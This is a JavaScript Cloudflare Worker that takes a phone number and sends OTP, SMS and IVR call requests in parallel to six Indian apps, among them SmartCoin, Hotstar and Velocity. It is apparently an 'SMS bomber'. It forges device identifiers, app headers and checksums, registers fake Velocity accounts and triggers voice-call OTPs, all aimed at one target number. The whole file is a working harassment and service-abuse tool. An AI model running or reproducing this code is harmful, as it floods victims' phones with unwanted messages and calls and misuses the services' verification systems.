// ========================
// Simple fetch wrapper (FlareGun removed)
// ========================
const fg = {
    fetch: (url, opts) => fetch(url, opts)
};

const COOLDOWN_SECONDS = 30;

// ========================
// Helper: random string
// ========================
function randomString(len = 8) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let out = '';
    const buf = new Uint8Array(len);
    crypto.getRandomValues(buf);
    for (let i = 0; i < len; i++) out += chars[buf[i] % chars.length];
    return out;
}

// ========================
// Helper: random hex
// ========================
function randomHex(len = 16) {
    const chars = 'abcdef0123456789';
    let out = '';
    const buf = new Uint8Array(len);
    crypto.getRandomValues(buf);
    for (let i = 0; i < len; i++) out += chars[buf[i] % chars.length];
    return out;
}

// ========================
// Helper: random UUID v4
// ========================
function randomUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
        const r = (crypto.getRandomValues(new Uint8Array(1))[0] % 16);
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// ========================
// Helper: random request_id (SmartCoin style)
// ========================
function randomRequestId() {
    return 'null' + Date.now() + Math.floor(Math.random() * 900 + 100);
}

// ========================
// Helper: random Hotstar ID
// ========================
function randomHotstarId() {
    return `${randomHex(6)}-${randomHex(6)}-${randomHex(6)}-${randomHex(6)}`;
}

// ========================
// Helper: random FCM token
// ========================
function randomFcmToken() {
    return 'engVAT6iTvu4Eu3KuCcpx7%3AAPA91b' + randomHex(120);
}

// ========================
// 1) MatePaisa
// ========================
async function sendMatePaisa(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    return await fg.fetch('https://gaeood-refaces.desisplit.com/nhcxs/qkirtt/gmthhn/rjbwl', {
        method: 'POST',
        headers: {
            'user-agent': 'Dart/3.9 (dart:io)',
            'accept-encoding': 'gzip',
            'csvdklegslngcfietkzyw': 'fdafd5267582605c',
            'content-type': 'application/json',
            'oqvudsrubclnkbxqkqkf': '1',
            'xegotqrowslanqjbqnq': 'MatePaisa',
            'svmdfygmarquc': '941079135e3105516b8bae927b6c21b2',
            'charset': 'utf-8',
            'host': 'gaeood-refaces.desisplit.com',
            'qddvjvvmcpunrdqb': 'com.matepaisa.credit.loantransaction.loantracker',
            'sdvlwapniboft': '',
            'zhfhtdjokwefdamtpcn': 'f7b27fba-3bcc-48ad-9964-6e853374c735',
            'craloswbfujlvad': '1'
        },
        body: JSON.stringify({ bglRycyMysat: clean })
    });
}

// ========================
// 2) Velocity (2-step)
// ========================
async function sendVelocity(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    const headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://dashboard.velocity.in',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://dashboard.velocity.in/',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5',
        'priority': 'u=1, i'
    };

    const createRes = await fg.fetch('https://thor.velocity.in/api/v1/users/', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            email: `user${clean}${randomString(8)}@mail.com`,
            full_name: `User ${clean.slice(-4)}`,
            phone: `+91${clean}`,
            password: 'Velocity@123',
            utm_params: '{}',
            preferences: {},
            application_type: null
        })
    });

    const createText = await createRes.text();
    let createData;
    try { createData = JSON.parse(createText); } catch { createData = createText; }

    const otpUuid =
        createData?.otp_uuid ||
        createData?.uuid ||
        createData?.data?.otp_uuid ||
        createData?.data?.uuid ||
        null;

    let otpData = null;
    if (otpUuid) {
        const otpRes = await fg.fetch('https://thor.velocity.in/api/v1/users/resend_otp_call', {
            method: 'POST',
            headers,
            body: JSON.stringify({ otp_uuid: otpUuid })
        });
        const t = await otpRes.text();
        try { otpData = JSON.parse(t); } catch { otpData = t; }
    }

    return {
        createUser: { status: createRes.status, response: createData },
        otp_uuid: otpUuid,
        resendOtp: otpData ? { response: otpData } : { skipped: true, reason: 'no otp_uuid' }
    };
}

// ========================
// 3) Beato (IVR OTP)
// ========================
async function sendBeato(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    return await fg.fetch('https://api.beatoapp.com/v7/onboarding/generateotp', {
        method: 'POST',
        headers: {
            'host': 'api.beatoapp.com',
            'os': 'Android',
            'appname': 'beato',
            'appversion': '4.00.226-380',
            'key': 'ac5eab8c-8914-49bc-931c-c360144205ec',
            'devicemodel': 'Redmi 6Xiaomi9',
            'content-type': 'application/json; charset=utf-8',
            'accept-encoding': 'gzip',
            'user-agent': 'okhttp/5.3.2'
        },
        body: JSON.stringify({
            email: '',
            isdcode: '+91',
            otptype: 'ivr',
            phone: clean,
            resend: true
        })
    });
}

// ========================
// 4) KarzNiti
// ========================
async function sendKarzNiti(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    return await fg.fetch('https://karznitiinterface.karyojana.com/oecm/hcihdx', {
        method: 'POST',
        headers: {
            'qzkehgfpacxckrsvdqphd': '8021d71b2a927dd8',
            'user-agent': 'Dart/3.9 (dart:io)',
            'accept-encoding': 'gzip',
            'content-type': 'application/json',
            'bhmigcvcfeksevo': 'app.loancompare.emicalc.creditbetter',
            'qboyqvegdbmdtpy': 'KarzNiti',
            'fchnitebabnkpto': '143a189f7ca5cb727d1e013a51cb741a',
            'wvzdfrtjjsvekenhsn': '',
            'charset': 'utf-8',
            'host': 'karznitiinterface.karyojana.com',
            'yvtyjgfsjbe': '1',
            'pothyefcbktwecri': '9d0f5264-64a8-44f9-b5ca-bb3b0771c355',
            'fhvkzjrqejxyjima': '1'
        },
        body: JSON.stringify({ uqooSlxcCzze: clean })
    });
}

// ========================
// 5) SmartCoin SMS → Auto Token → IVR  (AUTO FLOW)
// ========================
async function sendSmartCoin(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    // ==== Random device values (fresh per request) ====
    const android_id      = randomHex(16);
    const app_instance_id = randomHex(32);
    const google_ad_id    = randomUUID();
    const fcm_token       = randomFcmToken();
    const reqIdSms        = randomRequestId();
    const reqIdIvr        = randomRequestId();

    // ==== STEP 1: SMS API ====
    const smsUrl = 'https://webapp.smartcoin.co.in/users/null/onboarding/phone_number/submit'
        + `?name=null&device_id=null&android_id=${android_id}`
        + `&rooted=1&locale=en&app_instance_id=${app_instance_id}`
        + `&google_ad_id=${google_ad_id}&app_store_key=google_play_store`
        + `&fcm_token=${fcm_token}&fb_ref=null&utm_source=client_unknown`
        + `&utm_campaign=client_unknown&app_version=658&id_token=null`;

    const smsHeaders = {
        'checksum': 'H9jrQUwDi84VqF7G47U0jA==',
        'request_id': reqIdSms,
        'user_platform': 'ANDROID',
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; Redmi 6 MIUI/V11.0.5.0.PCGMIXM)',
        'Host': 'webapp.smartcoin.co.in',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    };

    const smsRes = await fg.fetch(smsUrl, {
        method: 'POST',
        headers: smsHeaders,
        body: JSON.stringify({
            'null': 'true',
            'enter_phone_number': clean
        })
    });

    const smsText = await smsRes.text();

    // ==== Extract token from response ====
    let token = null;

    // Pattern 1: phone_number/OnS.uHYn2O7ZIuw.6wcDXw
    let m = smsText.match(/phone_number\/([A-Za-z0-9._\-]+)/i);
    if (m) token = m[1];

    // Pattern 2: escaped slash version
    if (!token) {
        m = smsText.match(/phone_number\\\/([A-Za-z0-9._\-]+)/i);
        if (m) token = m[1];
    }

    // Pattern 3: JSON deep search
    if (!token) {
        try {
            const json = JSON.parse(smsText);
            token = deepFindPhoneToken(json);
        } catch { /* ignore */ }
    }

    if (!token) {
        return {
            sms: { status: smsRes.status, response: smsText },
            ivr: { skipped: true, reason: 'no token found' },
            token: null
        };
    }

    // ==== STEP 2: IVR API (auto-filled token) ====
    const ivrUrl = 'https://webapp.smartcoin.co.in/users/null/otpVerification/requestOtp/REGISTRATION/IVR'
        + `?phoneNumber=${encodeURIComponent(token)}`
        + `&isRetry=true&name=null&device_id=null&android_id=${android_id}`
        + `&rooted=1&locale=en&app_instance_id=${app_instance_id}`
        + `&google_ad_id=${google_ad_id}&app_store_key=google_play_store`
        + `&fcm_token=${fcm_token}&fb_ref=null&utm_source=client_unknown`
        + `&utm_campaign=client_unknown&app_version=658&id_token=null`
        + `&phone_number=${encodeURIComponent(token)}`;

    const ivrHeaders = {
        'checksum': 'u3jFsFNyLe/9rUsRUOGWow==',
        'request_id': reqIdIvr,
        'user_platform': 'ANDROID',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; Redmi 6 MIUI/V11.0.5.0.PCGMIXM)',
        'Host': 'webapp.smartcoin.co.in',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    };

    const ivrRes = await fg.fetch(ivrUrl, {
        method: 'GET',
        headers: ivrHeaders
    });
    const ivrText = await ivrRes.text();

    return {
        sms: { status: smsRes.status, response: smsText },
        token: token,
        ivr: { status: ivrRes.status, response: ivrText }
    };
}

// ========================
// Helper: deep find phone token
// ========================
function deepFindPhoneToken(obj) {
    if (typeof obj === 'string') {
        let m = obj.match(/phone_number\/([A-Za-z0-9._\-]+)/i);
        if (m) return m[1];
        m = obj.match(/phone_number\\\/([A-Za-z0-9._\-]+)/i);
        if (m) return m[1];
        return null;
    }
    if (obj && typeof obj === 'object') {
        for (const k in obj) {
            const found = deepFindPhoneToken(obj[k]);
            if (found) return found;
        }
    }
    return null;
}

// ========================
// 6) Hotstar OTP
// ========================
async function sendHotstar(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    const hsRequestId = randomHotstarId();
    const hsDeviceId  = randomHotstarId();

    const url = 'https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=resendOtp';

    const headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/154.0.8037.101 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'x-request-id': hsRequestId,
        'sec-ch-ua-platform': '"Android"',
        'x-hs-client': 'platform:mweb;app_version:26.09.23.0;browser:Chrome;schema_version:0.0.1797;os:Android;os_version:13;browser_version:4;network_data:4g',
        'sec-ch-ua': '"Chromium";v="154", "Android WebView";v="154", "Not A(Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'x-hs-platform': 'mweb',
        'x-country-code': 'in',
        'x-hs-accept-language': 'eng',
        'x-hs-device-id': hsDeviceId,
        'x-hs-app': '260923000',
        'x-hs-request-id': hsRequestId,
        'x-hs-is-retry': 'false',
        'accept-language': 'eng',
        'x-hs-retry-count': '0',
        'origin': 'https://www.hotstar.com',
        'x-requested-with': 'pure.lite.browser',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.hotstar.com/in/onboarding?ref=%2Fin',
        'priority': 'u=1, i',
        'Cookie': `geo=IN,MP,BHOPAL,23.27,77.40,45609; X-Akamai-Device=mweb; SELECTED__LANGUAGE=eng; deviceId=${hsDeviceId}; appLaunchCounter=3; userCountryCode=in`
    };

    const body = JSON.stringify({
        body: {
            '@type': 'type.googleapis.com/feature.login.InitiatePhoneLoginRequest',
            phone_number: clean,
            initiate_by: 1,
            recaptcha_token: '',
            source: 0
        }
    });

    return await fg.fetch(url, {
        method: 'POST',
        headers,
        body
    });
}

// ========================
// Safe wrapper
// ========================
async function safe(name, fn, phone) {
    try {
        const r = await fn(phone);

        // SmartCoin returns object (not Response)
        if (r && r.sms && r.ivr) {
            return { name, success: r.sms.status === 200, ...r };
        }

        if (r && r.createUser) {
            return { name, success: true, ...r };
        }

        const text = await r.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }

        return { name, success: r.status === 200, status: r.status, response: data };
    } catch (e) {
        return { name, success: false, error: e.message };
    }
}

// ========================
// Cooldown helpers (KV)
// ========================
async function isOnCooldown(env, phone) {
    if (!env || !env.COOLDOWN_KV) return { cooldown: false };
    const key = `cd:${phone}`;
    const val = await env.COOLDOWN_KV.get(key);
    if (!val) return { cooldown: false };

    const expiresAt = parseInt(val, 10);
    const now = Date.now();
    if (now < expiresAt) {
        const remaining = Math.ceil((expiresAt - now) / 1000);
        return { cooldown: true, remaining };
    }
    return { cooldown: false };
}

async function setCooldown(env, phone) {
    if (!env || !env.COOLDOWN_KV) return;
    const key = `cd:${phone}`;
    const expiresAt = Date.now() + COOLDOWN_SECONDS * 1000;
    await env.COOLDOWN_KV.put(key, String(expiresAt), { expirationTtl: 60 });
}

// ========================
// Worker Entry
// ========================
export default {
    async fetch(request, env) {
        const url = new URL(request.url);
        const mobile = url.searchParams.get('mobile');

        if (!mobile) {
            return new Response(JSON.stringify({ error: 'Missing ?mobile' }), {
                status: 400, headers: { 'Content-Type': 'application/json' }
            });
        }

        const clean = mobile.replace(/\D/g, '');
        if (clean.length !== 10) {
            return new Response(JSON.stringify({ error: 'Mobile must be exactly 10 digits' }), {
                status: 400, headers: { 'Content-Type': 'application/json' }
            });
        }

        // ⏳ Cooldown check
        const cd = await isOnCooldown(env, clean);
        if (cd.cooldown) {
            return new Response(JSON.stringify({
                mobile: clean,
                cooldown: true,
                remaining: cd.remaining,
                message: `Please wait ${cd.remaining}s before retrying this number`
            }), {
                status: 429,
                headers: { 'Content-Type': 'application/json' }
            });
        }

        // 🔥 6 APIs parallel
        const results = await Promise.all([
            safe('matepaisa', sendMatePaisa, clean),
            safe('velocity', sendVelocity, clean),
            safe('beato', sendBeato, clean),
            safe('karzniti', sendKarzNiti, clean),
            safe('smartcoin', sendSmartCoin, clean),
            safe('hotstar', sendHotstar, clean)
        ]);

        const successCount = results.filter(r => r.success).length;

        await setCooldown(env, clean);

        return new Response(JSON.stringify({
            mobile: clean,
            cooldown: true,
            cooldown_seconds: COOLDOWN_SECONDS,
            total: results.length,
            success: successCount,
            failed: results.length - successCount,
            results
        }, null, 2), {
            status: 200, headers: { 'Content-Type': 'application/json' }
        });
    }
};
